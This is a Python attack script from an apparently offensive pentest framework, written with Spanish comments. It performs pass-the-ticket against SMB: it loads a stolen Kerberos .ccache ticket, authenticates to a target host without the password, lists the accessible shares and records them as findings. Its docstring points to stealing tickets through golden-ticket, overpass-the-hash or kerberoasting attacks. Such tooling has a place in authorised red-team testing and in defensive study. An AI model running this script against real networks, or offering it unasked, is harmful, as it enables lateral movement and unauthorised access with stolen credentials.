# scripts/smb/attack/pass_the_ticket.py
"""
Pass-the-Ticket sobre SMB.

Usa un ticket Kerberos (.ccache) para autenticarse vía SMB sin necesitar
la contraseña. Útil tras robar tickets con overpass-the-hash, golden ticket,
kerberoasting + crack, etc.

Diferencia con pass-the-hash:
  - PTH: necesitas el hash NT → autentica vía NTLM
  - PTT: necesitas el ticket → autentica vía Kerberos

Requisitos:
  - El DC debe ser alcanzable por el cliente para validar el ticket.
  - El ticket debe ser válido (no expirado, para el servicio correcto).
  - impacket >= 0.10

Uso:
  lobera.py smb --script=pass-the-ticket -t 10.10.10.5 -u administrator
                -d CORP.LOCAL --ccache /tmp/admin.ccache
"""

import os
from scripts.base import BaseScript
from core.output import print_result, print_table, console
from core import session_db

try:
    from modules.smb import SMBModule
    _SMB_OK = True
except ImportError:
    _SMB_OK = False


class Script(BaseScript):
    name        = "pass-the-ticket"
    protocol    = "smb"
    category    = "attack"
    description = (
        "Autentica en SMB usando un ticket Kerberos (.ccache) en lugar de contraseña. "
        "Lista shares accesibles con el ticket importado."
    )

    EXAMPLES = [
        {
            "flag":  "--ccache",
            "desc":  "Ruta al fichero .ccache con el ticket a usar",
            "good":  "lobera.py smb --script=pass-the-ticket -t 10.10.10.5 -u administrator -d CORP.LOCAL --ccache /tmp/admin.ccache",
            "bad":   "lobera.py smb --script=pass-the-ticket -t 10.10.10.5  [sin --ccache no hay ticket que usar]",
        },
    ]

    def run(self, **kwargs):
        if not _SMB_OK:
            print_result("SMB", str(self.target.ip), "fail",
                         "módulo SMB no disponible"); return

        ccache = getattr(self.creds, "ccache", None) or kwargs.get("ccache")
        if not ccache:
            print_result("SMB", str(self.target.ip), "fail",
                         "Falta --ccache: proporciona la ruta al fichero .ccache")
            return

        if not os.path.exists(ccache):
            print_result("SMB", str(self.target.ip), "fail",
                         f"No existe el fichero: {ccache}")
            return

        # Asegurarnos de que el módulo SMB usará el ccache
        self.creds.ccache = ccache
        os.environ["KRB5CCNAME"] = ccache

        console.rule("[bold yellow]Pass-the-Ticket → SMB[/bold yellow]")
        console.print(f"  Ticket : [cyan]{ccache}[/cyan]")
        console.print(f"  Usuario: [cyan]{self.creds.user or '(del ticket)'}[/cyan]")
        console.print(f"  Dominio: [cyan]{self.creds.domain or self.target.domain or '?'}[/cyan]")

        smb = SMBModule(self.target, self.creds)
        if not smb.connect():
            return
        if not smb.login():
            smb.disconnect()
            return

        # Listar shares con el ticket activo
        try:
            shares = smb.list_shares() or []
            if shares:
                print_table(
                    f"Shares accesibles con ticket ({len(shares)})",
                    ["Share", "Tipo", "Comentario"],
                    [(s.get("name", "?"), s.get("type", "?"), s.get("comment", ""))
                     for s in shares],
                )
                for s in shares:
                    session_db.save_finding(
                        self.target.ip, "SMB", "share_found",
                        f"PTT - {s.get('name','?')} ({s.get('type','?')})"
                    )
            else:
                console.print("  [yellow]Sin shares accesibles con este ticket[/yellow]")
        except Exception as e:
            console.print(f"  [red]Error listando shares: {e}[/red]")

        smb.disconnect()
